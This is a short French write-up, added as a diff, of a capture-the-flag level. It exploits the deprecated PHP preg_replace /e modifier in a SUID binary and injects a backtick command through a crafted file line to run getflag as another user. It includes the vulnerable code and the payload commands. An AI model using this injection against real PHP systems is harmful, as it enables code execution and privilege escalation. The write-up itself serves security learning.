@@ -1,0 +1,29 @@
+Definition:
+En PHP, l’option `/e` dans `preg_replace` permettait d’exécuter du code PHP dans la chaîne remplacée (cette option est maintenant supprimée car dangereuse).  
+Cela permet ici une injection de commande via le contenu d’un fichier.
+
+Piste:
+Dans le répertoire on trouve un binaire SUID appartenant à `flag06` :  
+
+$ ls -la  
+-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06  
+
+En regardant le code source (PHP), on observe :  
+
+php
+$a = file_get_contents($y); 
+$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
+
+
+on a compris que le code permet de lancer une fonction avec le /e
+
+
+donc 
+
+echo '[x ${`getflag`}]' >> /tmp/test.txt
+
+puis j'ai lancer executable.
+./level06 /tmp/test.txt
+
+
+
